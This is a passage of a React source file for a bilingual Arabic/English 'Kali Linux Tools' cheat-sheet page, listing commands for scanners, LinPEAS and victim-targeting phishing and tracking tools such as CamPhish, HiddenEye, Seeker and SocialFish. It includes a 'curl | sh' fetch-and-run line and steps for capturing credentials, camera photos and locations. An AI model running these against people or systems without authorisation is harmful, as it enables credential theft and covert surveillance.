      { command: "nuclei -l urls.txt", description: { ar: "فحص قائمة أهداف", en: "Scan URL list" } },
      { command: "nuclei -u https://target.com -t cves/", description: { ar: "فحص CVEs فقط", en: "CVE templates only" } },
      { command: "nuclei -u https://target.com -severity critical,high", description: { ar: "الخطورة العالية فقط", en: "Critical/high only" } },
      { command: "nuclei -u https://target.com -o results.txt", description: { ar: "حفظ النتائج", en: "Save results" } },
      { command: "nuclei -u https://target.com -t technologies/", description: { ar: "اكتشاف التقنيات", en: "Tech detection" } },
      { command: "nuclei -u https://target.com -t exposures/", description: { ar: "كشف التسريبات", en: "Exposure detection" } },
      { command: "nuclei -u https://target.com -rate-limit 100", description: { ar: "تحديد السرعة", en: "Rate limiting" } },
      { command: "nuclei -u https://target.com -c 50", description: { ar: "50 اتصال متزامن", en: "50 concurrent" } },
      { command: "nuclei -update-templates", description: { ar: "تحديث القوالب", en: "Update templates" } },
      { command: "nuclei -u https://target.com -H 'Cookie: session=abc'", description: { ar: "مع Headers مخصصة", en: "Custom headers" } },
      { command: "nuclei -u https://target.com -proxy http://127.0.0.1:8080", description: { ar: "عبر بروكسي", en: "Via proxy" } },
      { command: "nuclei -u https://target.com -tags wordpress", description: { ar: "قوالب WordPress", en: "WordPress templates" } },
      { command: "nuclei -u https://target.com -author pdelteil", description: { ar: "قوالب مؤلف محدد", en: "Specific author" } },
      { command: "nuclei -u https://target.com -json", description: { ar: "إخراج JSON", en: "JSON output" } },
      { command: "nuclei -u https://target.com -silent", description: { ar: "وضع صامت", en: "Silent mode" } },
      { command: "nuclei -u https://target.com -new-templates", description: { ar: "القوالب الجديدة فقط", en: "New templates only" } },
      { command: "nuclei -u https://target.com -stats", description: { ar: "عرض الإحصائيات", en: "Show stats" } },
      { command: "nuclei -u https://target.com -exclude-tags dos", description: { ar: "استبعاد DoS", en: "Exclude DoS" } },
      { command: "nuclei -u https://target.com -debug", description: { ar: "وضع التصحيح", en: "Debug mode" } },
    ],
  },
  {
    name: "Subfinder",
    description: { ar: "أداة اكتشاف النطاقات الفرعية السريعة", en: "Fast subdomain discovery tool" },
    commands: [
      { command: "subfinder -d domain.com", description: { ar: "اكتشاف أساسي", en: "Basic discovery" } },
      { command: "subfinder -dL domains.txt", description: { ar: "قائمة نطاقات", en: "Domain list" } },
      { command: "subfinder -d domain.com -o subs.txt", description: { ar: "حفظ النتائج", en: "Save results" } },
      { command: "subfinder -d domain.com -all", description: { ar: "جميع المصادر", en: "All sources" } },
      { command: "subfinder -d domain.com -silent", description: { ar: "وضع صامت", en: "Silent mode" } },
      { command: "subfinder -d domain.com -t 100", description: { ar: "100 خيط", en: "100 threads" } },
      { command: "subfinder -d domain.com -nW", description: { ar: "بدون Wildcard", en: "No wildcard" } },
      { command: "subfinder -d domain.com -r 8.8.8.8", description: { ar: "DNS محدد", en: "Specific DNS" } },
      { command: "subfinder -d domain.com -recursive", description: { ar: "بحث عودي", en: "Recursive search" } },
      { command: "subfinder -d domain.com -cs", description: { ar: "Collect sources", en: "Collect sources" } },
      { command: "subfinder -d domain.com -json", description: { ar: "إخراج JSON", en: "JSON output" } },
      { command: "subfinder -d domain.com -timeout 30", description: { ar: "وقت انتظار 30 ثانية", en: "30 sec timeout" } },
      { command: "subfinder -d domain.com -max-time 10", description: { ar: "أقصى وقت 10 دقائق", en: "Max 10 minutes" } },
      { command: "subfinder -d domain.com -exclude-sources source1", description: { ar: "استبعاد مصدر", en: "Exclude source" } },
      { command: "subfinder -ls", description: { ar: "قائمة المصادر", en: "List sources" } },
      { command: "subfinder -d domain.com -config config.yaml", description: { ar: "ملف إعدادات", en: "Config file" } },
      { command: "subfinder -d domain.com -v", description: { ar: "وضع مفصل", en: "Verbose" } },
      { command: "subfinder -d domain.com -oJ results.json", description: { ar: "حفظ JSON", en: "Save JSON" } },
      { command: "subfinder -d domain.com -rate-limit 10", description: { ar: "تحديد السرعة", en: "Rate limit" } },
      { command: "subfinder -d domain.com -proxy http://127.0.0.1:8080", description: { ar: "عبر بروكسي", en: "Via proxy" } },
    ],
  },
  {
    name: "Masscan",
    description: { ar: "أسرع ماسح منافذ في العالم", en: "World's fastest port scanner" },
    commands: [
      { command: "masscan 192.168.1.0/24 -p80", description: { ar: "فحص منفذ واحد", en: "Scan single port" } },
      { command: "masscan 192.168.1.0/24 -p1-65535", description: { ar: "جميع المنافذ", en: "All ports" } },
      { command: "masscan 192.168.1.0/24 --top-ports 100", description: { ar: "أشهر 100 منفذ", en: "Top 100 ports" } },
      { command: "masscan 192.168.1.0/24 -p80,443,8080", description: { ar: "منافذ محددة", en: "Specific ports" } },
      { command: "masscan 192.168.1.0/24 --rate 10000", description: { ar: "10,000 حزمة/ثانية", en: "10,000 pps" } },
      { command: "masscan 192.168.1.0/24 -oL results.txt", description: { ar: "حفظ كقائمة", en: "Save as list" } },
      { command: "masscan 192.168.1.0/24 -oX results.xml", description: { ar: "حفظ XML", en: "Save XML" } },
      { command: "masscan 192.168.1.0/24 -oG results.gnmap", description: { ar: "حفظ Greppable", en: "Save greppable" } },
      { command: "masscan 192.168.1.0/24 --banners", description: { ar: "جلب البانرات", en: "Grab banners" } },
      { command: "masscan 192.168.1.0/24 --ping", description: { ar: "فحص Ping", en: "Ping scan" } },
      { command: "masscan 192.168.1.0/24 --excludefile exclude.txt", description: { ar: "استبعاد قائمة", en: "Exclude list" } },
      { command: "masscan 0.0.0.0/0 -p443 --rate 100000", description: { ar: "فحص الإنترنت", en: "Internet scan" } },
      { command: "masscan 192.168.1.0/24 -e eth0", description: { ar: "واجهة محددة", en: "Specific interface" } },
      { command: "masscan 192.168.1.0/24 --source-ip 10.0.0.1", description: { ar: "IP مصدر مخصص", en: "Custom source IP" } },
      { command: "masscan 192.168.1.0/24 --wait 10", description: { ar: "انتظار 10 ثواني", en: "Wait 10 seconds" } },
      { command: "masscan 192.168.1.0/24 --randomize-hosts", description: { ar: "ترتيب عشوائي", en: "Randomize hosts" } },
      { command: "masscan 192.168.1.0/24 --retries 3", description: { ar: "3 محاولات", en: "3 retries" } },
      { command: "masscan --echo > config.conf", description: { ar: "حفظ الإعدادات", en: "Save config" } },
      { command: "masscan -c config.conf", description: { ar: "من ملف إعدادات", en: "From config file" } },
      { command: "masscan --resume paused.conf", description: { ar: "استكمال الفحص", en: "Resume scan" } },
    ],
  },
  {
    name: "LinPEAS",
    description: { ar: "أداة تصعيد صلاحيات Linux", en: "Linux privilege escalation tool" },
    commands: [
      { command: "curl https://linpeas.sh | sh", description: { ar: "تشغيل مباشر", en: "Direct execution" } },
      { command: "./linpeas.sh", description: { ar: "تشغيل محلي", en: "Local execution" } },
      { command: "./linpeas.sh -a", description: { ar: "جميع الفحوصات", en: "All checks" } },
      { command: "./linpeas.sh -s", description: { ar: "فحص سريع", en: "Quick scan" } },
      { command: "./linpeas.sh -P password", description: { ar: "اختبار كلمة مرور", en: "Test password" } },
      { command: "./linpeas.sh -o output.txt", description: { ar: "حفظ النتائج", en: "Save results" } },
      { command: "./linpeas.sh -q", description: { ar: "وضع هادئ", en: "Quiet mode" } },
      { command: "./linpeas.sh -N", description: { ar: "بدون ألوان", en: "No colors" } },
      { command: "./linpeas.sh -e /tmp", description: { ar: "استبعاد مسار", en: "Exclude path" } },
      { command: "./linpeas.sh -t", description: { ar: "وقت التنفيذ", en: "Execution time" } },
      { command: "./linpeas.sh -c", description: { ar: "فحص مخصص", en: "Custom check" } },
      { command: "./linpeas.sh -d", description: { ar: "وضع التصحيح", en: "Debug mode" } },
      { command: "less -R output.txt", description: { ar: "عرض النتائج بالألوان", en: "View with colors" } },
      { command: "python3 -m http.server 8000", description: { ar: "خادم لنقل الملف", en: "File transfer server" } },
      { command: "wget http://IP:8000/linpeas.sh", description: { ar: "تحميل على الهدف", en: "Download to target" } },
      { command: "chmod +x linpeas.sh", description: { ar: "صلاحيات التنفيذ", en: "Make executable" } },
      { command: "./linpeas.sh 2>&1 | tee output.txt", description: { ar: "حفظ + عرض", en: "Save + display" } },
      { command: "grep -i password output.txt", description: { ar: "البحث عن كلمات مرور", en: "Search passwords" } },
      { command: "grep 'CVE\\|Vulnerable' output.txt", description: { ar: "البحث عن CVEs", en: "Search CVEs" } },
      { command: "./linpeas.sh -h", description: { ar: "المساعدة", en: "Help" } },
    ],
  },
  {
    name: "CamPhish",
    description: { ar: "أداة لالتقاط صور من كاميرا الضحية عبر صفحات وهمية", en: "Capture photos from victim's camera via phishing pages" },
    commands: [
      { command: "git clone https://github.com/techchipnet/CamPhish", description: { ar: "تحميل الأداة", en: "Download tool" } },
      { command: "cd CamPhish", description: { ar: "الدخول للمجلد", en: "Enter directory" } },
      { command: "bash camphish.sh", description: { ar: "تشغيل الأداة", en: "Run tool" } },
      { command: "apt install php curl", description: { ar: "تثبيت المتطلبات", en: "Install requirements" } },
      { command: "Select template (1-4)", description: { ar: "اختيار قالب الصفحة", en: "Select page template" } },
      { command: "Start Ngrok server", description: { ar: "تشغيل سيرفر Ngrok", en: "Start Ngrok server" } },
      { command: "Copy phishing URL", description: { ar: "نسخ رابط التصيد", en: "Copy phishing URL" } },
      { command: "Captured images → images/", description: { ar: "الصور الملتقطة في مجلد images", en: "Captured images in images folder" } },
      { command: "python3 -m http.server 8080", description: { ar: "سيرفر بديل", en: "Alternative server" } },
      { command: "cloudflared tunnel --url localhost:8080", description: { ar: "نفق Cloudflare", en: "Cloudflare tunnel" } },
    ],
  },
  {
    name: "HiddenEye",
    description: { ar: "أداة تصيد متقدمة مع صفحات وهمية متعددة", en: "Advanced phishing tool with multiple fake pages" },
    commands: [
      { command: "git clone https://github.com/Jeenali-Shah/hiddeneye", description: { ar: "تحميل الأداة", en: "Download tool" } },
      { command: "cd hiddeneye && pip3 install -r requirements.txt", description: { ar: "تثبيت المتطلبات", en: "Install requirements" } },
      { command: "python3 HiddenEye.py", description: { ar: "تشغيل الأداة", en: "Run tool" } },
      { command: "Select social media target", description: { ar: "اختيار منصة التصيد", en: "Select target platform" } },
      { command: "Choose tunneling (Ngrok/Serveo)", description: { ar: "اختيار النفق", en: "Choose tunnel" } },
      { command: "Custom phishing page builder", description: { ar: "إنشاء صفحة مخصصة", en: "Custom page builder" } },
      { command: "Keylogger integration", description: { ar: "تكامل مع Keylogger", en: "Keylogger integration" } },
      { command: "IP + Location capture", description: { ar: "التقاط IP والموقع", en: "Capture IP + Location" } },
      { command: "logs/credentials.txt", description: { ar: "ملف البيانات الملتقطة", en: "Captured credentials file" } },
      { command: "python3 HiddenEye.py --update", description: { ar: "تحديث الأداة", en: "Update tool" } },
    ],
  },
  {
    name: "Seeker",
    description: { ar: "أداة لتتبع الموقع الجغرافي للهدف بدقة عالية", en: "High accuracy location tracking tool" },
    commands: [
      { command: "git clone https://github.com/thewhiteh4t/seeker", description: { ar: "تحميل الأداة", en: "Download tool" } },
      { command: "cd seeker && chmod +x install.sh && ./install.sh", description: { ar: "تثبيت الأداة", en: "Install tool" } },
      { command: "python3 seeker.py", description: { ar: "تشغيل الأداة", en: "Run tool" } },
      { command: "Select template (NearYou/WhatsApp/Telegram)", description: { ar: "اختيار قالب", en: "Select template" } },
      { command: "python3 seeker.py -t manual", description: { ar: "رابط مخصص", en: "Custom URL" } },
      { command: "python3 seeker.py -k API_KEY", description: { ar: "استخدام API", en: "Use API key" } },
      { command: "Captured data: IP, Location, Device", description: { ar: "البيانات: IP والموقع والجهاز", en: "Data: IP, Location, Device" } },
      { command: "python3 seeker.py -h", description: { ar: "المساعدة", en: "Help" } },
      { command: "db.txt → All captured data", description: { ar: "جميع البيانات المحفوظة", en: "All saved data" } },
      { command: "Google Maps integration", description: { ar: "تكامل مع خرائط Google", en: "Google Maps integration" } },
    ],
  },
  {
    name: "SocialFish",
    description: { ar: "منصة تصيد احترافية مع لوحة تحكم ويب", en: "Professional phishing platform with web dashboard" },
    commands: [
      { command: "git clone https://github.com/UndeadSec/SocialFish", description: { ar: "تحميل الأداة", en: "Download tool" } },
      { command: "cd SocialFish && pip3 install -r requirements.txt", description: { ar: "تثبيت المتطلبات", en: "Install requirements" } },
      { command: "python3 SocialFish.py", description: { ar: "تشغيل الأداة", en: "Run tool" } },
      { command: "Access dashboard: http://localhost:5000", description: { ar: "الدخول للوحة التحكم", en: "Access dashboard" } },
      { command: "Create new phishing campaign", description: { ar: "إنشاء حملة تصيد", en: "Create campaign" } },
      { command: "Clone any website", description: { ar: "استنساخ أي موقع", en: "Clone any website" } },
      { command: "Real-time credential capture", description: { ar: "التقاط فوري للبيانات", en: "Real-time capture" } },
      { command: "Analytics dashboard", description: { ar: "لوحة إحصائيات", en: "Analytics dashboard" } },
      { command: "Export captured data", description: { ar: "تصدير البيانات", en: "Export data" } },
      { command: "python3 SocialFish.py --port 8080", description: { ar: "منفذ مخصص", en: "Custom port" } },
    ],
  },
  {
    name: "Hound",
    description: { ar: "أداة للبحث عن معلومات الأهداف عبر الإنترنت", en: "OSINT tool to gather target information" },
    commands: [
      { command: "git clone https://github.com/techchipnet/Hound", description: { ar: "تحميل الأداة", en: "Download tool" } },
      { command: "cd Hound && chmod +x hound.sh", description: { ar: "إعطاء الصلاحيات", en: "Set permissions" } },
      { command: "bash hound.sh", description: { ar: "تشغيل الأداة", en: "Run tool" } },
      { command: "Option 1: Track location", description: { ar: "تتبع الموقع", en: "Track location" } },
      { command: "Option 2: Get device info", description: { ar: "معلومات الجهاز", en: "Device info" } },
      { command: "Option 3: Get IP address", description: { ar: "عنوان IP", en: "IP address" } },
      { command: "Option 4: Browser info", description: { ar: "معلومات المتصفح", en: "Browser info" } },
      { command: "Ngrok integration", description: { ar: "تكامل مع Ngrok", en: "Ngrok integration" } },
      { command: "results/ → Saved data", description: { ar: "البيانات المحفوظة", en: "Saved data" } },
      { command: "bash hound.sh -h", description: { ar: "المساعدة", en: "Help" } },
    ],
  },
  {
    name: "PhoneInfoga",
    description: { ar: "أداة استخبارات لأرقام الهواتف", en: "Phone number OSINT tool" },
    commands: [
      { command: "go install github.com/sundowndev/phoneinfoga/v2@latest", description: { ar: "تثبيت عبر Go", en: "Install via Go" } },
      { command: "phoneinfoga scan -n +1234567890", description: { ar: "فحص رقم", en: "Scan number" } },
      { command: "phoneinfoga serve", description: { ar: "تشغيل واجهة الويب", en: "Start web interface" } },
      { command: "Access: http://localhost:5000", description: { ar: "فتح في المتصفح", en: "Open in browser" } },
      { command: "phoneinfoga scan -n NUMBER --json", description: { ar: "نتائج JSON", en: "JSON output" } },
      { command: "Get carrier information", description: { ar: "معلومات الناقل", en: "Carrier info" } },
      { command: "Google dorks integration", description: { ar: "بحث Google متقدم", en: "Google dorks" } },
      { command: "Social media lookup", description: { ar: "بحث مواقع التواصل", en: "Social media lookup" } },
      { command: "Numverify API integration", description: { ar: "تكامل Numverify", en: "Numverify API" } },
      { command: "phoneinfoga -h", description: { ar: "المساعدة", en: "Help" } },
    ],
  },
  {
    name: "Sherlock",
    description: { ar: "البحث عن أسماء المستخدمين عبر مئات المنصات", en: "Hunt usernames across hundreds of platforms" },
    commands: [
      { command: "git clone https://github.com/sherlock-project/sherlock", description: { ar: "تحميل الأداة", en: "Download tool" } },
      { command: "pip3 install -r requirements.txt", description: { ar: "تثبيت المتطلبات", en: "Install requirements" } },
      { command: "python3 sherlock username", description: { ar: "بحث عن مستخدم", en: "Search username" } },
      { command: "python3 sherlock user1 user2 user3", description: { ar: "بحث عدة مستخدمين", en: "Search multiple users" } },
      { command: "python3 sherlock username --output results.txt", description: { ar: "حفظ النتائج", en: "Save results" } },
      { command: "python3 sherlock username --csv", description: { ar: "تصدير CSV", en: "Export CSV" } },
      { command: "python3 sherlock username --timeout 10", description: { ar: "وقت الانتظار", en: "Timeout" } },
      { command: "python3 sherlock username --print-found", description: { ar: "طباعة الموجود فقط", en: "Print found only" } },
      { command: "python3 sherlock username --site twitter", description: { ar: "موقع محدد", en: "Specific site" } },
      { command: "python3 sherlock --help", description: { ar: "المساعدة", en: "Help" } },
    ],
  },
  {
    name: "SpiderFoot",
    description: { ar: "منصة استخبارات شاملة مفتوحة المصدر", en: "Comprehensive open-source OSINT platform" },
    commands: [
      { command: "pip3 install spiderfoot", description: { ar: "تثبيت الأداة", en: "Install tool" } },
      { command: "spiderfoot -l 127.0.0.1:5001", description: { ar: "تشغيل واجهة الويب", en: "Start web interface" } },
      { command: "Access: http://127.0.0.1:5001", description: { ar: "فتح في المتصفح", en: "Open in browser" } },
      { command: "Create new scan", description: { ar: "إنشاء فحص جديد", en: "Create new scan" } },
      { command: "Target types: Domain, IP, Email, Phone", description: { ar: "أنواع الأهداف", en: "Target types" } },
      { command: "Modules: 200+ reconnaissance modules", description: { ar: "أكثر من 200 وحدة استطلاع", en: "200+ recon modules" } },
      { command: "Visualize results graph", description: { ar: "عرض النتائج برسم بياني", en: "Visualize results" } },
      { command: "Export: CSV, JSON, GEXF", description: { ar: "تصدير البيانات", en: "Export data" } },
      { command: "API integration", description: { ar: "تكامل API", en: "API integration" } },
      { command: "spiderfoot -h", description: { ar: "المساعدة", en: "Help" } },
    ],
  },
  {
    name: "ReconDog",
    description: { ar: "أداة استطلاع شاملة للمعلومات", en: "Comprehensive reconnaissance tool" },
    commands: [
      { command: "git clone https://github.com/s0md3v/ReconDog", description: { ar: "تحميل الأداة", en: "Download tool" } },
      { command: "cd ReconDog && python3 dog.py", description: { ar: "تشغيل الأداة", en: "Run tool" } },
      { command: "Option 1: Censys lookup", description: { ar: "بحث Censys", en: "Censys lookup" } },
      { command: "Option 2: NS lookup", description: { ar: "بحث NS", en: "NS lookup" } },
      { command: "Option 3: Port scan", description: { ar: "فحص المنافذ", en: "Port scan" } },
      { command: "Option 4: Whois lookup", description: { ar: "بحث Whois", en: "Whois lookup" } },
      { command: "Option 5: Zone transfer", description: { ar: "نقل المنطقة", en: "Zone transfer" } },
      { command: "Option 6: HTTP headers", description: { ar: "رؤوس HTTP", en: "HTTP headers" } },
      { command: "Option 7: Honeypot detection", description: { ar: "كشف Honeypot", en: "Honeypot detection" } },
      { command: "python3 dog.py -h", description: { ar: "المساعدة", en: "Help" } },
    ],
  },
  {
    name: "Ghost Phisher",
    description: { ar: "أداة هجمات لاسلكية وتصيد متقدمة", en: "Advanced wireless and phishing attack tool" },
    commands: [
      { command: "apt install ghost-phisher", description: { ar: "تثبيت من Kali", en: "Install from Kali" } },
      { command: "ghost-phisher", description: { ar: "تشغيل الأداة", en: "Run tool" } },
      { command: "Fake AP creation", description: { ar: "إنشاء نقطة وصول وهمية", en: "Create fake AP" } },
      { command: "HTTP/HTTPS sniffing", description: { ar: "التقاط HTTP/HTTPS", en: "HTTP/HTTPS sniffing" } },
      { command: "Session hijacking", description: { ar: "اختطاف الجلسات", en: "Session hijacking" } },
      { command: "Credential harvesting", description: { ar: "جمع البيانات", en: "Credential harvesting" } },
      { command: "DNS spoofing", description: { ar: "انتحال DNS", en: "DNS spoofing" } },
      { command: "DHCP starvation", description: { ar: "هجوم DHCP", en: "DHCP starvation" } },
      { command: "ARP spoofing", description: { ar: "انتحال ARP", en: "ARP spoofing" } },
      { command: "Export logs", description: { ar: "تصدير السجلات", en: "Export logs" } },
    ],
  },
];

const ToolsPage = () => {
  const [expandedTool, setExpandedTool] = useState<number | null>(0);
  const [copiedCommand, setCopiedCommand] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [language, setLanguage] = useState<"ar" | "en">("ar");
  const { exportToPdf } = usePdfExport();

  const copyCommand = (command: string) => {
    navigator.clipboard.writeText(command);
    setCopiedCommand(command);
    setTimeout(() => setCopiedCommand(null), 2000);
  };

  const handleExportPdf = () => {
    const data = tools.map(tool => ({
      title: tool.name,
      items: tool.commands.map(cmd => ({
        name: cmd.command,
        description: language === "ar" ? cmd.description.ar : cmd.description.en,
      })),
    }));
    exportToPdf(data, "kali-tools.pdf", language === "ar" ? "أدوات كالي لينكس" : "Kali Linux Tools");
  };

  const filteredTools = useMemo(() => {
    if (!searchQuery.trim()) return tools;
    const query = searchQuery.toLowerCase();
    return tools.filter(
      (tool) =>
        tool.name.toLowerCase().includes(query) ||
        tool.description.ar.includes(searchQuery) ||
        tool.description.en.toLowerCase().includes(query) ||
        tool.commands.some(
          (cmd) =>
            cmd.command.toLowerCase().includes(query) ||
            cmd.description.ar.includes(searchQuery) ||
            cmd.description.en.toLowerCase().includes(query)
        )
    );
  }, [searchQuery]);

  const totalCommands = tools.reduce((acc, tool) => acc + tool.commands.length, 0);

  const t = {
    title: language === "ar" ? "أدوات كالي لينكس" : "Kali Linux Tools",
    subtitle: language === "ar" 
      ? `${tools.length} أداة احترافية مع ${totalCommands} أمر` 
      : `${tools.length} professional tools with ${totalCommands} commands`,
    search: language === "ar" ? "ابحث عن أداة أو أمر..." : "Search for a tool or command...",
    commands: language === "ar" ? "أمر" : "commands",
  };

  return (
    <div className="min-h-screen bg-background">
      <Navbar />
      <main className="pt-24 pb-16">
        <div className="container mx-auto px-4">
          {/* Header */}
          <div className="text-center mb-12">
            <div className="flex justify-center mb-6">
              <div className="cyber-icon-box">
                <Terminal className="w-10 h-10 text-primary" />
              </div>
            </div>
            <div className="flex items-center justify-center gap-3 mb-4">
              <h1 className="text-4xl md:text-5xl font-bold text-primary text-glow">
                {t.title}
              </h1>
              <button
                onClick={() => setLanguage(prev => prev === "ar" ? "en" : "ar")}
                className="p-2 rounded-lg bg-secondary border border-border/50 hover:border-primary/50 transition-colors"
              >
                <Globe className="w-5 h-5 text-muted-foreground" />
              </button>
              <button
                onClick={handleExportPdf}
                className="p-2 rounded-lg bg-secondary border border-border/50 hover:border-primary/50 transition-colors flex items-center gap-2"
                title={language === "ar" ? "تحميل PDF" : "Download PDF"}
              >
                <Download className="w-5 h-5 text-muted-foreground" />
              </button>
            </div>
            <p className="text-muted-foreground text-lg max-w-2xl mx-auto">{t.subtitle}</p>
          </div>

          {/* Search */}
          <div className="max-w-2xl mx-auto mb-10">
            <div className="relative">
              <Search className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground" />
              <input
                type="text"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder={t.search}
                className="w-full px-4 py-3 pr-12 rounded-xl bg-secondary border border-border/50 text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-primary/50 focus:ring-2 focus:ring-primary/20 transition-all"
                dir={language === "ar" ? "rtl" : "ltr"}
              />
            </div>
          </div>

          {/* Tools Grid */}
          <div className="max-w-6xl mx-auto space-y-4">
            {filteredTools.map((tool, index) => (
              <div key={index} className="cyber-card overflow-hidden">
                <button
                  onClick={() => setExpandedTool(expandedTool === index ? null : index)}
                  className="w-full p-5 flex items-center justify-between hover:bg-primary/5 transition-colors"
                >
                  <div className="flex items-center gap-4">
                    <div className="w-16 h-16 rounded-xl bg-primary/10 border border-primary/30 flex items-center justify-center">
                      {(() => {
                        const IconComponent = toolIcons[tool.name] || Terminal;
                        return <IconComponent className="w-8 h-8 text-primary" />;
                      })()}
                    </div>
                    <div className={language === "ar" ? "text-right" : "text-left"}>
                      <h3 className="text-2xl font-bold text-primary">{tool.name}</h3>
                      <p className="text-muted-foreground text-base mt-1">
                        {language === "ar" ? tool.description.ar : tool.description.en}
                      </p>
                    </div>
                  </div>
                  <div className="flex items-center gap-4">
                    <span className="px-3 py-1 rounded-lg bg-primary/10 text-primary text-sm font-medium">{tool.commands.length} {t.commands}</span>
                    {expandedTool === index ? (
                      <ChevronUp className="w-6 h-6 text-primary" />
                    ) : (
                      <ChevronDown className="w-6 h-6 text-muted-foreground" />
                    )}
                  </div>
                </button>

                {expandedTool === index && (
                  <div className="border-t border-border/30 p-4 grid grid-cols-1 md:grid-cols-2 gap-3 animate-fade-in">
                    {tool.commands.map((cmd, cmdIndex) => (
                      <div
                        key={cmdIndex}
                        className="flex items-start gap-3 p-3 rounded-xl bg-secondary/50 hover:bg-secondary/80 transition-colors group"
                      >
                        <span className="w-7 h-7 rounded-lg bg-primary/20 text-primary flex items-center justify-center font-bold text-xs flex-shrink-0">
                          {cmdIndex + 1}
                        </span>
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center gap-2 mb-1">
                            <code className="text-primary text-xs font-mono bg-background/50 px-2 py-0.5 rounded break-all" dir="ltr">
                              {cmd.command}
                            </code>
                            <button
                              onClick={() => copyCommand(cmd.command)}
                              className="p-1 rounded hover:bg-primary/20 transition-colors opacity-0 group-hover:opacity-100 flex-shrink-0"
                            >
                              {copiedCommand === cmd.command ? (
                                <Check className="w-3 h-3 text-primary" />
                              ) : (
                                <Copy className="w-3 h-3 text-muted-foreground" />
                              )}
                            </button>
                          </div>
                          <p className="text-muted-foreground text-xs">
                            {language === "ar" ? cmd.description.ar : cmd.description.en}
                          </p>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
};

export default ToolsPage;
